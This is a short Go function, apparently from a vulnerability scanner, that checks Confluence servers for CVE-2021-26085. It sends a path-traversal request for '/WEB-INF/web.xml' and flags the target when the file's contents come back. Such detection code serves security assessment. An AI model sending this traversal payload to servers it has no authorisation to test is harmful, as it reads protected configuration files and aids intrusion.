package confluence

import (
	"Predator/pkg/utils"
	"strings"
)

func CVE_2021_26085(u string) bool {
	if req, err := utils.HttpRequset(u+"/s/1/_/;/WEB-INF/web.xml", "GET", "", false, nil); err == nil {
		if strings.Contains(req.Body, "display-name") {
			return true
		}
	}
	return false
}
